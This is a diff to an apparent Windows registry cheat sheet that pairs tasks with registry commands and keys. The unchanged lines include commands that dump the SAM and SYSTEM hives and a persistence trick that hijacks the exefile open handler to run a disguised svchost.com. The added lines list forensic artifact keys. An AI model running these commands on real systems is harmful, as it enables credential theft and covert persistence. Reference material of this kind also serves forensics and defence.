@@ -33,3 +33,13 @@ Service Info----reg query HKLM\SYSTEM\CurrentControlSet\Services\hMailServer
 Dump Windows SAM file----reg save hklm\sam c:\sam 
 Dump Windows SYSTEM file----reg save hklm\system c:\system
 Persistence----reg add HKLM\SOFTWARE\Classes\exefile\shell\open /v command /t REG_SZ /d '%SystemRoot%\svchost.com "%1" %*'
+Previously Connected WiFi access points----HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\NetworkList\Profiles 
+Connected USB Devices----HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR
+Typed URLs (from iexplore or Edge)----HKCU\SOFTWARE\Microsoft\Internet Explorer\TypedURLs
+Recently-Opened Documents----HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs
+Shim Cache (recently executed .EXEs run in compatibility mode)----HKLM\SYSTEM\CurrentControlSet\Control\SessionManager\AppCompatCache\AppCompatCache
+Most Actively Used .EXE List----HKCU\Software\Microsoft\Windows \CurrentVersion\Explorer\UserAssist (Note: Bins are ROT13)
+"Shell Bags" (Folders that have been opened up in explorer at least once)----HKCU\Software\Microsoft\Windows\Shell\BagMRU
+
+
+
